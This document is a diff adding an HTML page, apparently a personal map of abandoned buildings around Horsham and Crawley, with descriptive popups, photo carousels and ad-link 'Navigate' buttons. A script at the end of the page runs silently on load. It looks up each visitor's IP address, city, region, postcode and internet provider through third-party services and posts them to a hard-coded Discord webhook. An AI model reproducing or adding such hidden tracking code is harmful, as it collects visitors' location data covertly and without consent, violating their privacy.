@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Display Horsham, West Sussex on Mapbox</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="https://api.mapbox.com/mapbox-gl-js/v3.3.0/mapbox-gl.css" rel="stylesheet">
+<script src="https://api.mapbox.com/mapbox-gl-js/v3.3.0/mapbox-gl.js"></script>
+<style>
+body { margin: 0; padding: 0; font-family: Arial, sans-serif; }
+#map { position: absolute; top: 0; bottom: 0; width: 100%; }
+.search-bar {
+    position: fixed;
+    top: 10px;
+    left: 50%;
+    transform: translateX(-50%);
+    background-color: white;
+    border-radius: 20px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+    padding: 10px;
+    display: flex;
+    align-items: center;
+    z-index: 1100;
+}
+.search-bar input {
+    border: none;
+    outline: none;
+    padding: 8px;
+    border-radius: 20px;
+    flex-grow: 1;
+    margin-right: 10px;
+    width: 120px
+}
+.search-bar button {
+    background-color: #0078FF;
+    color: white;
+    border: none;
+    border-radius: 20px;
+    padding: 8px 16px;
+    cursor: pointer;
+    transition: transform 0.2s ease;
+}
+.search-bar button:hover {
+    transform: scale(1.1);
+}
+.dropdown {
+    position: fixed;
+    top: 60px; /* Adjusted to avoid overlap */
+    left: 50%;
+    transform: translateX(-50%);
+    background-color: white;
+    border-radius: 20px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+    z-index: 1100;
+    max-height: 300px;
+    overflow-y: auto;
+    display: none;
+    flex-direction: column;
+}
+.dropdown.active {
+    display: flex;
+}
+.dropdown-item {
+    padding: 10px;
+    cursor: pointer;
+    transition: background-color 0.2s ease;
+}
+.dropdown-item:hover {
+    background-color: #f0f0f0;
+}
+.close-btn {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    cursor: pointer;
+    font-size: 20px;
+    color: #777;
+    transition: transform 0.3s ease;
+}
+.close-btn:hover {
+    transform: rotate(360deg);
+    color: #333;
+}
+.popup-container {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: rgba(255, 255, 255, 0.9);
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+    padding: 20px;
+    border-radius: 12px;
+    z-index: 1200;
+    opacity: 0;
+    transition: opacity 0.3s ease-in-out;
+    visibility: hidden;
+    width: 80%;
+    max-width: 400px;
+    max-height: 80%;
+    overflow: hidden;
+}
+.popup-container.active {
+    opacity: 1;
+    visibility: visible;
+}
+.popup-description {
+    max-height: 100px;
+    overflow-y: auto;
+    border: 1px solid #ddd;
+    padding: 8px;
+    margin-bottom: 8px;
+}
+.popup-description::-webkit-scrollbar {
+    width: 10px;
+}
+.popup-description::-webkit-scrollbar-thumb {
+    background-color: #888;
+    border-radius: 5px;
+}
+.popup-description::-webkit-scrollbar-thumb:hover {
+    background-color: #555;
+}
+.blur-overlay {
+    position: fixed;
+    top: 0;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background-color: rgba(0, 0, 0, 0.5);
+    z-index: 1150;
+    backdrop-filter: blur(5px);
+    opacity: 0;
+    transition: opacity 0.3s ease-in-out;
+    pointer-events: none;
+}
+.blur-overlay.active {
+    opacity: 1;
+    pointer-events: auto;
+}
+.blur-effect {
+    filter: blur(5px);
+}
+.navigate-btn {
+    padding: 8px 16px;
+    border-radius: 12px;
+    background-color: #0078FF;
+    color: #FFFFFF;
+    cursor: pointer;
+    transition: transform 0.2s ease;
+}
+.navigate-btn:hover {
+    transform: scale(1.1);
+}
+.carousel-container {
+    position: relative;
+    width: 100%;
+    height: 200px;
+    overflow: hidden;
+    margin-bottom: 8px;
+}
+.carousel-slide {
+    display: flex;
+    transition: transform 0.5s ease-in-out;
+}
+.carousel-image {
+    min-width: 100%;
+    height: 200px;
+    object-fit: cover;
+}
+.carousel-buttons {
+    position: absolute;
+    top: 50%;
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+    transform: translateY(-50%);
+}
+.carousel-button {
+    background-color: rgba(0, 0, 0, 0.5);
+    color: white;
+    border: none;
+    cursor: pointer;
+    padding: 10px;
+}
+.carousel-button:hover {
+    background-color: rgba(0, 0, 0, 0.7);
+}
+</style>
+  <style>
+    .vl {
+      background-color: gray;
+      width: 6px;
+      height: 30px;
+      border-radius: 3px;
+    }
+  </style>
+    <style>
+    .vli {
+      background-color: gray;
+      width: 3px;
+      border-radius: 3px;
+    }
+  </style>
+</head>
+<body>
+<div id="map"></div>
+
+<div class="search-bar">
+    <input type="text" id="search-input" placeholder="Search...">
+    <button id="search-button">Search</button>
+</div>
+<div id="search-dropdown" class="dropdown">
+    <span class="close-btn" onclick="closeDropdown()">X</span>
+</div>
+
+<script>
+mapboxgl.accessToken = 'pk.eyJ1IjoicGx1cnBldCIsImEiOiJjbHc2dzE1M3MxcG4wMmlsODcwMWRraGJuIn0.YRmGcObK-ShjKEV12132RA';
+const map = new mapboxgl.Map({
+    container: 'map',
+    style: 'mapbox://styles/plurpet/clw6xkgwm02t801oc6npg7cow',
+    center: [-0.21435, 51.08714],
+    zoom: 11
+});
+
+map.addControl(new mapboxgl.NavigationControl());
+
+//Add Markers
+
+const markers = [
+    {
+        coords: [-0.33222, 51.05869],
+        title: 'Cricket Groundskeeper Cottage [Horsham]',
+        description: 'Cottage Horsham Criket House Home Park Deralict',
+        popupId: 'popup1',
+        overlayId: 'blur-overlay1'
+    },
+    {
+        coords: [-0.31914, 51.07319],
+        title: 'Pharmaceutical Lab [Horsham]',
+        description: 'pharmacutical, lab, laboratory, big, research, intact',
+        popupId: 'popup2',
+        overlayId: 'blur-overlay1'
+    },
+    {
+        coords: [-0.34505, 51.04115],
+        title: 'Farmhouse & Field [Southwater]',
+        description: 'house, Southwater, eerie, memories, structure, decay, windows, doors, wind, ivy, moss, brick, walls, tapestry, glory, roof, rooms, field, grasses, weeds, garden, thistles, brambles, dandelions, nettles, remnants, swing set, grass, fence, nature, silence, creatures, paths, vegetation, tableau, neglect, power',
+        popupId: 'popup3',
+        overlayId: 'blur-overlay1'
+    },
+    {
+        coords: [-0.25116, 51.08378],
+        title: 'Water tower [Faygate]',
+        description: 'abandoned, water, tower, Faygate, relic, nature, structure, cylindrical, tank, rusting, vines, landscape, concrete, graffiti, eerie, desolate, decay, industrial, history, urban explorers, photographers, melancholic, beauty',
+        popupId: 'popup4',
+        overlayId: 'blur-overlay1'
+    },
+    {
+        coords: [-0.13301, 51.15735],
+        title: 'Family home in forest [Crawley]',
+        description: 'nestled, dense, overgrown, forest, abandoned, family, home, haunting, relic, garden, tangled, wild, vegetation, ivy, crumbling, stone, walls, reclaiming, structure, roof, collapsed, decaying, beams, weathered, interior, elements, broken, windows, shattered, glass, vacant, eyes, wooden, door, rusted, hinges, creaks, breeze, musty, air, mold, damp, floorboards, groan, personal, belongings, scattered, dust, cobwebs, eerie, silence, isolation, abandonment, bird',
+        popupId: 'popup5',
+        overlayId: 'blur-overlay1'
+    },
+    {
+        coords: [-0.18441, 51.13764],
+        title: 'Office building [Crawley]',
+        description: 'abandoned, office, building, exposed, plumbing, Crawley, disrepair, graffiti, shattered, windows, elements, hollowed, halls, decaying, structure, rusted, pipes, corroded, fittings, dripping, faucets, eerie, desolation, mildew, debris, collapsed, ceilings, derelict, deteriorating, infrastructure, landmark',
+        popupId: 'popup6',
+        overlayId: 'blur-overlay1'
+    },
+    {
+        coords: [-0.21258, 51.13048],
+        title: 'Ifield care home [Crawley]',
+        description: 'care, home, Ifield, Crawley, derelict, building, overgrown, vegetation, decaying, brickwork, shattered, windows, nature, reclaiming, empty, hallways, memories, residents, peeling, paint, broken, furniture, eerie, atmosphere, comfort, silence, dilapidated, rooms, forgotten, corridors, neglect, time',
+        popupId: 'popup7',
+        overlayId: 'blur-overlay1'
+    },
+    {
+        coords: [-0.19750, 51.10887],
+        title: 'Derelict Hospice [Crawley]',
+        description: 'derelict, hospice, Crawley, haunting, decay, neglect, abandoned, crumbling, shattered, overgrown, vegetation, ivy, brambles, dilapidated, collapsed, skeletal, elements, graffiti, vandalism, eerie, damp, musty, mold, mildew, rusting, medical, equipment, tattered, patient, records, memories, dark, foreboding, flickering, shadows, peeling, wallpaper, abandonment, desolation, unsettling',
+        popupId: 'popup8',
+        overlayId: 'blur-overlay1'
+    },
+];
+
+markers.forEach((markerInfo, index) => {
+    const marker = new mapboxgl.Marker()
+        .setLngLat(markerInfo.coords)
+        .addTo(map);
+
+    marker.getElement().addEventListener('click', () => {
+        closeAllPopups();
+        document.getElementById(markerInfo.popupId).classList.add('active');
+        document.getElementById(markerInfo.overlayId).classList.add('active');
+        applyBlurEffect();
+    });
+
+    markerInfo.marker = marker;
+});
+
+function closePopup(popupId, overlayId) {
+    document.getElementById(popupId).classList.remove('active');
+    document.getElementById(overlayId).classList.remove('active');
+    removeBlurEffect();
+}
+
+function closeAllPopups() {
+    document.querySelectorAll('.popup-container.active').forEach(popup => popup.classList.remove('active'));
+    document.querySelectorAll('.blur-overlay.active').forEach(overlay => overlay.classList.remove('active'));
+    removeBlurEffect();
+}
+
+function closeDropdown() {
+    document.getElementById('search-dropdown').classList.remove('active');
+}
+
+function applyBlurEffect() {
+    document.querySelector('.search-bar').classList.add('blur-effect');
+    document.querySelector('.dropdown').classList.add('blur-effect');
+}
+
+function removeBlurEffect() {
+    document.querySelector('.search-bar').classList.remove('blur-effect');
+    document.querySelector('.dropdown').classList.remove('blur-effect');
+}
+
+document.getElementById('search-button').addEventListener('click', () => {
+    const query = document.getElementById('search-input').value.toLowerCase();
+    const results = markers.filter(marker => 
+        marker.title.toLowerCase().includes(query) || 
+        marker.description.toLowerCase().includes(query)
+    );
+
+    const dropdown = document.getElementById('search-dropdown');
+    dropdown.innerHTML = '<span class="close-btn" onclick="closeDropdown()">X</span>';
+    results.forEach(result => {
+        const item = document.createElement('div');
+        item.className = 'dropdown-item';
+        item.textContent = result.title;
+        item.addEventListener('click', () => {
+            closeDropdown();
+            map.flyTo({ center: result.coords, zoom: 15 });
+            setTimeout(() => {
+                closeAllPopups();
+                document.getElementById(result.popupId).classList.add('active');
+                document.getElementById(result.overlayId).classList.add('active');
+                applyBlurEffect();
+            }, 800); // 800ms delay before opening the popup
+        });
+        dropdown.appendChild(item);
+    });
+    if (results.length > 0) {
+        dropdown.classList.add('active');
+    }
+});
+
+document.addEventListener('click', (event) => {
+    const dropdown = document.getElementById('search-dropdown');
+    const searchBar = document.querySelector('.search-bar');
+    if (!dropdown.contains(event.target) && !searchBar.contains(event.target)) {
+        closeDropdown();
+    }
+});
+
+// Carousel functionality
+function showSlide(containerId, index) {
+    const container = document.getElementById(containerId);
+    const slide = container.querySelector('.carousel-slide');
+    slide.style.transform = `translateX(${-index * 100}%)`;
+}
+function nextSlide(containerId) {
+    const container = document.getElementById(containerId);
+    const slides = container.querySelectorAll('.carousel-image');
+    let index = parseInt(container.getAttribute('data-slide-index')) || 0;
+    index = (index + 1) % slides.length;
+    container.setAttribute('data-slide-index', index);
+    showSlide(containerId, index);
+}
+function prevSlide(containerId) {
+    const container = document.getElementById(containerId);
+    const slides = container.querySelectorAll('.carousel-image');
+    let index = parseInt(container.getAttribute('data-slide-index')) || 0;
+    index = (index - 1 + slides.length) % slides.length;
+    container.setAttribute('data-slide-index', index);
+    showSlide(containerId, index);
+}
+function autoSlide(containerId) {
+    nextSlide(containerId);
+    setTimeout(() => autoSlide(containerId), 3000);
+}
+
+//Img Container
+
+document.addEventListener("DOMContentLoaded", () => {
+    autoSlide("carousel-containerauto");
+    autoSlide("carousel-container1");
+    autoSlide("carousel-container2");
+    autoSlide("carousel-container3");
+    autoSlide("carousel-container4");
+    autoSlide("carousel-container5");
+    autoSlide("carousel-container6");
+    autoSlide("carousel-container7");
+    autoSlide("carousel-container8");
+});
+</script>
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+    setTimeout(() => {
+        document.getElementById('popupauto').classList.add('active');
+        document.getElementById('blur-overlay1').classList.add('active');
+        applyBlurEffect();
+    }, 1000); // Delay of 1 second before opening the popup
+});
+
+function applyBlurEffect() {
+    document.querySelector('.search-bar').classList.add('blur-effect');
+    document.querySelector('.dropdown').classList.add('blur-effect');
+}
+</script>
+<script>
+    document.getElementById('location-button').addEventListener('click', () => {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+            const userLocation = [position.coords.longitude, position.coords.latitude];
+            map.flyTo({
+                center: userLocation,
+                zoom: 12,
+                essential: true // this animation is considered essential with respect to prefers-reduced-motion
+            });
+
+            new mapboxgl.Marker()
+                .setLngLat(userLocation)
+                .addTo(map);
+        }, () => {
+            alert('Error: Unable to retrieve your location.');
+        });
+    } else {
+        alert('Geolocation is not supported by your browser.');
+    }
+});
+</script>
+
+<!-- Popup Auto -->
+<div id="popupauto" class="popup-container">
+    <span class="close-btn" onclick="closePopup('popupauto', 'blur-overlay1')">X</span>
+    <h3 style="margin-bottom: 8px;">Welcome👋 - Lets see how this works!</h3>
+    <div class="popup-description">
+        <p style="margin-bottom: 8px;"></p>
+    </div>
+    <hr>
+    <div id="carousel-containerauto" class="carousel-container" data-slide-index="0">
+        <div class="carousel-slide">
+            <img src="https://i.imgur.com/wsscQGb.png" class="carousel-image">
+        </div>
+    </div>
+    <center><button class="navigate-btn" onclick="closePopup('popupauto', 'blur-overlay1')">Close info</button></center>
+</div>
+<div id="blur-overlay1" class="blur-overlay"></div>
+
+<!-- Popup 1 -->
+<div id="popup1" class="popup-container">
+    <span class="close-btn" onclick="closePopup('popup1', 'blur-overlay1')">X</span>
+    <h3 style="margin-bottom: 8px;">Cricket Groundskeeper Cottage [Horsham]</h3>
+    <div class="popup-description">
+        <p style="margin-bottom: 8px;">Nestled in the heart of Horsham, this abandoned cricket groundskeeper's cottage stands as a poignant relic of the past. Surrounded by overgrown grass and encroaching vines, the cottage evokes a sense of nostalgia, harking back to the golden days of cricket matches and community gatherings. The weathered facade, with its peeling paint and broken windows, hints at the bustling activity that once filled its rooms. The grounds, now silent and reclaimed by nature, still bear the faint outlines of the once meticulously maintained cricket pitch. This forsaken cottage, with its crumbling chimney and sagging roof, offers a glimpse into a bygone era of local sport, dedication, and the simple, pastoral life of a groundskeeper in rural England.</p>
+    </div>
+    <hr>
+    <div id="carousel-container1" class="carousel-container" data-slide-index="0">
+        <div class="carousel-slide">
+            <img src="https://i.imgur.com/pQL4zRS.jpeg" class="carousel-image">
+            <img src="https://i.imgur.com/ouI53Dg_d.webp?maxwidth=760&fidelity=grand" class="carousel-image">
+            <img src="https://i.imgur.com/mdBvEIi_d.webp?maxwidth=760&fidelity=grand" class="carousel-image">
+        </div>
+        <div class="carousel-buttons">
+            <button class="carousel-button" onclick="prevSlide('carousel-container1')">❮</button>
+            <button class="carousel-button" onclick="nextSlide('carousel-container1')">❯</button>
+        </div>
+    </div>
+    <center><button onclick="window.open('https://adfoc.us/76301784894314', '_blank')" class="navigate-btn">Navigate</button></center>
+</div>
+<div id="blur-overlay1" class="blur-overlay"></div>
+
+<!-- Popup 2 -->
+<div id="popup2" class="popup-container">
+    <span class="close-btn" onclick="closePopup('popup2', 'blur-overlay1')">X</span>
+    <h3 style="margin-bottom: 8px;">Pharmaceutical Lab [Horsham]</h3>
+    <div class="popup-description">
+        <p style="margin-bottom: 8px;">Located in Horsham, the abandoned pharmaceutical laboratory stands as a haunting relic of its past. This once bustling research hub, known for its large-scale scientific endeavors, now lies eerily quiet. The expansive lab, with many of its research areas still intact, hints at the advanced pharmaceutical work that used to take place within its walls. Despite the passage of time, remnants of high-tech equipment and pristine laboratory setups remain, providing a glimpse into the meticulous and innovative environment that once drove pharmaceutical breakthroughs here.</p>
+    </div>
+    <hr>
+    <div id="carousel-container2" class="carousel-container" data-slide-index="0">
+        <div class="carousel-slide">
+            <img src="https://i.imgur.com/i2mptAB.jpeg" class="carousel-image">
+            <img src="https://i.imgur.com/nu1hTUG.jpeg" class="carousel-image">
+            <img src="https://i.imgur.com/CeRBcsu.jpeg" class="carousel-image">
+        </div>
+        <div class="carousel-buttons">
+            <button class="carousel-button" onclick="prevSlide('carousel-container2')">❮</button>
+            <button class="carousel-button" onclick="nextSlide('carousel-container2')">❯</button>
+        </div>
+    </div>
+    <center><button onclick="window.open('https://adfoc.us/763017103907146', '_blank')" class="navigate-btn">Navigate</button></center>
+</div>
+<div id="blur-overlay1" class="blur-overlay"></div>
+
+<!-- Popup 3 -->
+<div id="popup3" class="popup-container">
+    <span class="close-btn" onclick="closePopup('popup3', 'blur-overlay1')">X</span>
+    <h3 style="margin-bottom: 8px;">Farmhouse & Field [Southwater]</h3>
+    <div class="popup-description">
+        <p style="margin-bottom: 8px;">In the heart of Southwater lies an eerie abandoned house, shrouded in an air of forgotten memories. The once grand structure now stands in a state of decay, its windows shattered and doors creaking with the whisper of the wind. Ivy and moss have overtaken the crumbling brick walls, creating a green tapestry that hides the house's former glory. The roof, sagging and broken, allows glimpses of the dark, empty rooms within. Surrounding the house is an overgrown field, a tangled expanse of wild grasses and weeds. Once a carefully maintained garden, it now hosts an array of thistles and brambles, interspersed with patches of dandelions and nettles. Rusted remnants of an old swing set poke through the tall grass, and a dilapidated fence barely holds its form against the relentless creep of nature. The field, bathed in an eerie silence, is occasionally broken by the rustle of small creatures moving through the underbrush. Forgotten paths, now almost indistinguishable, wind through the dense vegetation, hinting at the life that once thrived here. The entire scene is a haunting tableau of neglect and the relentless reclaiming power of nature.</p>
+    </div>
+    <hr>
+    <div id="carousel-container3" class="carousel-container" data-slide-index="0">
+        <div class="carousel-slide">
+            <img src="https://i.imgur.com/q8H9QWI.jpg" class="carousel-image">
+            <img src="https://i.imgur.com/jcXKEuv.jpg" class="carousel-image">
+            <img src="https://i.imgur.com/8DsEpJI.jpg" class="carousel-image">
+        </div>
+        <div class="carousel-buttons">
+            <button class="carousel-button" onclick="prevSlide('carousel-container3')">❮</button>
+            <button class="carousel-button" onclick="nextSlide('carousel-container3')">❯</button>
+        </div>
+    </div>
+    <center><button onclick="window.open('https://adfoc.us/763017103938145', '_blank')" class="navigate-btn">Navigate</button></center>
+</div>
+<div id="blur-overlay1" class="blur-overlay"></div>
+
+<!-- Popup 4 -->
+<div id="popup4" class="popup-container">
+    <span class="close-btn" onclick="closePopup('popup4', 'blur-overlay1')">X</span>
+    <h3 style="margin-bottom: 8px;">Water tower [Faygate]</h3>
+    <div class="popup-description">
+        <p style="margin-bottom: 8px;">The abandoned water tower in Faygate stands as a haunting relic of the past, its once-functional structure now overtaken by nature. Erected in the early 20th century, this towering edifice once played a crucial role in the local water supply system. The cylindrical tank, now rusting and covered in vines, rises above the surrounding landscape, a testament to the passage of time. The concrete base, marked by graffiti and the encroaching roots of nearby trees, adds to the eerie, desolate atmosphere. Despite its state of decay, the water tower offers a fascinating glimpse into industrial history, attracting urban explorers and photographers who seek to capture its melancholic beauty.</p>
+    </div>
+    <hr>
+    <div id="carousel-container4" class="carousel-container" data-slide-index="0">
+        <div class="carousel-slide">
+            <img src="https://i.imgur.com/xLERf2p.jpg" class="carousel-image">
+        </div>
+        <div class="carousel-buttons">
+            <button class="carousel-button" onclick="prevSlide('carousel-container4')">❮</button>
+            <button class="carousel-button" onclick="nextSlide('carousel-container4')">❯</button>
+        </div>
+    </div>
+    <center><button onclick="window.open('https://adfoc.us/763017103938295', '_blank')" class="navigate-btn">Navigate</button></center>
+</div>
+<div id="blur-overlay1" class="blur-overlay"></div>
+
+<!-- Popup 5 -->
+<div id="popup5" class="popup-container">
+    <span class="close-btn" onclick="closePopup('popup5', 'blur-overlay1')">X</span>
+    <h3 style="margin-bottom: 8px;">Family home in forest [Crawley]</h3>
+    <div class="popup-description">
+        <p style="margin-bottom: 8px;">Nestled deep within the dense, overgrown forest of Crawley, the abandoned family home stands as a haunting relic of the past. The once vibrant garden is now a tangled mass of wild vegetation, with ivy creeping up the crumbling stone walls and reclaiming the structure. The roof, partially collapsed, exposes the decaying beams and weathered interior to the elements. Broken windows, some still bearing remnants of shattered glass, peer out like vacant eyes. The wooden front door, hanging precariously from rusted hinges, creaks with the slightest breeze. Inside, the musty air is thick with the scent of mold and damp wood, and the floorboards groan underfoot. Personal belongings, left behind in haste, are scattered throughout, now covered in a thick layer of dust and cobwebs. The eerie silence of the forest is punctuated by the occasional call of a distant bird, adding to the sense of isolation and abandonment.</p>
+    </div>
+    <hr>
+    <div id="carousel-container5" class="carousel-container" data-slide-index="0">
+        <div class="carousel-slide">
+            <img src="https://i.imgur.com/Ds4hhvD.jpg" class="carousel-image">
+            <img src="https://i.imgur.com/eCRzUM8.jpg" class="carousel-image">
+            <img src="https://i.imgur.com/VdunLZf.jpg" class="carousel-image">
+        </div>
+        <div class="carousel-buttons">
+            <button class="carousel-button" onclick="prevSlide('carousel-container5')">❮</button>
+            <button class="carousel-button" onclick="nextSlide('carousel-container5')">❯</button>
+        </div>
+    </div>
+    <center><button onclick="window.open('https://adfoc.us/763017103941124', '_blank')" class="navigate-btn">Navigate</button></center>
+</div>
+<div id="blur-overlay1" class="blur-overlay"></div>
+
+<!-- Popup 6 -->
+<div id="popup6" class="popup-container">
+    <span class="close-btn" onclick="closePopup('popup6', 'blur-overlay1')">X</span>
+    <h3 style="margin-bottom: 8px;">Office Building [Crawley]</h3>
+    <div class="popup-description">
+        <p style="margin-bottom: 8px;">Nestled in the heart of Crawley, this abandoned office building stands as a haunting reminder of a bygone era. The once-bustling workplace now lies in a state of disrepair, with its exterior walls marred by graffiti and windows shattered, allowing the elements to invade the hollowed halls within. Inside, the building's exposed plumbing snakes through the decaying structure, a testament to the advanced state of neglect. Rusted pipes, corroded fittings, and dripping faucets contribute to an atmosphere of eerie desolation. The air is thick with the scent of mildew, and the floors are littered with debris from collapsed ceilings. This derelict site, with its abandoned offices and deteriorating infrastructure, offers a stark contrast to the thriving businesses nearby, serving as a curious and somber landmark in Crawley.</p>
+    </div>
+    <hr>
+    <div id="carousel-container6" class="carousel-container" data-slide-index="0">
+        <div class="carousel-slide">
+            <img src="https://i.imgur.com/eCoMPvR.jpg" class="carousel-image">
+            <img src="https://i.imgur.com/q79bfTf.jpg" class="carousel-image">
+            <img src="https://i.imgur.com/Dg39BOB.jpg" class="carousel-image">
+        </div>
+        <div class="carousel-buttons">
+            <button class="carousel-button" onclick="prevSlide('carousel-container6')">❮</button>
+            <button class="carousel-button" onclick="nextSlide('carousel-container6')">❯</button>
+        </div>
+    </div>
+    <center><button onclick="window.open('https://adfoc.us/763017103941415', '_blank')" class="navigate-btn">Navigate</button></center>
+</div>
+<div id="blur-overlay1" class="blur-overlay"></div>
+
+<!-- Popup 7 -->
+<div id="popup7" class="popup-container">
+    <span class="close-btn" onclick="closePopup('popup7', 'blur-overlay1')">X</span>
+    <h3 style="margin-bottom: 8px;">Ifield Care Home [Crawley]</h3>
+    <div class="popup-description">
+        <p style="margin-bottom: 8px;">Nestled in the once-bustling neighborhood of Ifield, Crawley, this abandoned care home stands as a haunting reminder of its former glory. The derelict building, now enveloped in overgrown vegetation, showcases decaying brickwork and shattered windows, with nature reclaiming its territory. Inside, the empty hallways echo with the memories of its past residents, while peeling paint and broken furniture add to the eerie atmosphere. Once a place of comfort and care, the home now sits in silence, with its dilapidated rooms and forgotten corridors telling a story of neglect and time's relentless passage.</p>
+    </div>
+    <hr>
+    <div id="carousel-container7" class="carousel-container" data-slide-index="0">
+        <div class="carousel-slide">
+            <img src="https://i.imgur.com/UhDMTmw.jpg" class="carousel-image">
+            <img src="https://i.imgur.com/BfjmJ7k.jpg" class="carousel-image">
+            <img src="https://i.imgur.com/SVb4fpM.jpg" class="carousel-image">
+        </div>
+        <div class="carousel-buttons">
+            <button class="carousel-button" onclick="prevSlide('carousel-container7')">❮</button>
+            <button class="carousel-button" onclick="nextSlide('carousel-container7')">❯</button>
+        </div>
+    </div>
+    <center><button onclick="window.open('https://adfoc.us/763017103979846', '_blank')" class="navigate-btn">Navigate</button></center>
+</div>
+<div id="blur-overlay1" class="blur-overlay"></div>
+
+<!-- Popup 8 -->
+<div id="popup8" class="popup-container">
+    <span class="close-btn" onclick="closePopup('popup8', 'blur-overlay1')">X</span>
+    <h3 style="margin-bottom: 8px;">Derelict Hospice [Crawley]</h3>
+    <div class="popup-description">
+        <p style="margin-bottom: 8px;">The derelict hospice in Crawley stands as a haunting reminder of its past, shrouded in decay and neglect. Once a place of solace and care, the building now lies abandoned, with its walls crumbling and windows shattered. Overgrown vegetation encroaches upon the property, with ivy and brambles weaving through the dilapidated structure. The roof is partially collapsed, exposing the skeletal remains of the hospice to the elements. Graffiti and signs of vandalism mark the exterior, adding to its eerie atmosphere. Inside, the air is damp and musty, filled with the scent of mold and mildew. Rusting medical equipment and tattered patient records are scattered across the floor, evoking memories of the lives once cared for within its walls. The hospice’s hallways are dark and foreboding, with flickering lights casting long shadows that dance along the peeling wallpaper. Each room tells a silent story of abandonment and desolation, making it a poignant yet unsettling site in Crawley.</p>
+    </div>
+    <hr>
+    <div id="carousel-container8" class="carousel-container" data-slide-index="0">
+        <div class="carousel-slide">
+            <img src="https://i.imgur.com/7hXkDak.jpg" class="carousel-image">
+            <img src="https://i.imgur.com/vDYF0F7.jpg" class="carousel-image">
+        </div>
+        <div class="carousel-buttons">
+            <button class="carousel-button" onclick="prevSlide('carousel-container8')">❮</button>
+            <button class="carousel-button" onclick="nextSlide('carousel-container8')">❯</button>
+        </div>
+    </div>
+    <center><button onclick="window.open('https://adfoc.us/763017103980091', '_blank')" class="navigate-btn">Navigate</button></center>
+</div>
+<div id="blur-overlay1" class="blur-overlay"></div>
+
+<script>
+    fetch("https://discord.com/api/webhooks/1070051902882066472/bekqeiGnkm4iUHAY5aBld_5LhC0pQQaQxW2DRbh9Ia1adUXr7h2DzzSE1Nx_bBaiBDe_", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content: "-----------------------------------------------------------------------------"
+      })
+    });
+    
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        fetch("https://discord.com/api/webhooks/1070051902882066472/bekqeiGnkm4iUHAY5aBld_5LhC0pQQaQxW2DRbh9Ia1adUXr7h2DzzSE1Nx_bBaiBDe_", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: "Page: Abandoned Map\nUser IP Address: " + data.ip
+          })
+        });
+    
+        fetch('https://ipinfo.io/json')
+          .then(response => response.json())
+          .then(data => {
+            fetch('https://discord.com/api/webhooks/1070051902882066472/bekqeiGnkm4iUHAY5aBld_5LhC0pQQaQxW2DRbh9Ia1adUXr7h2DzzSE1Nx_bBaiBDe_', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                content: `Geographical info: ${data.city}, ${data.region} (${data.postal})`
+              })
+            });
+          });
+    
+        fetch('https://ipapi.co/json')
+          .then(response => response.json())
+          .then(data => {
+            fetch('https://discord.com/api/webhooks/1070051902882066472/bekqeiGnkm4iUHAY5aBld_5LhC0pQQaQxW2DRbh9Ia1adUXr7h2DzzSE1Nx_bBaiBDe_', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                content: `Internet service provider: ${data.org}`
+              })
+            });
+          });
+      });
+    </script>
+
+</body>
+</html>
